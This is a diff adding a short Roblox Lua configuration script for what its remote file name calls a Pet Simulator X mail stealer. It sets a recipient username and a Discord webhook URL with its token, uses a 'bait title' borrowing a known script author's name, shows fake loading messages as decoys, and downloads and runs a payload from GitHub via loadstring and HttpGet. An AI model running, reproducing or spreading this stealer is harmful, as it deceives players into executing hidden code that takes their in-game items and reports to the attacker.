@@ -1,0 +1,8 @@
+local player_USERNAME = "HawkwatchTzy_Gaming" 
+local discord_WEBHOOK = "https://discord.com/api/webhooks/1111892381990662204/dhOvbUdRw2hVdIlrkXFHm312XmK7TpoeMDiO76rSmFk-veTLTS1rEHN45yJrowl4wlMz" -- leave blank if no webhook 
+local Custom_Script_Name = "Rafacasari" -- bait title
+local txt_1 = "Script loaded.." 
+local txt_2 = "Waiting for the script to load.." 
+local txt_3 = "Adjusting graphics.." 
+local txt_4 = "Please wait.." 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DrakeIsEpic/Scripts3/main/petsimxmailstealer"))()
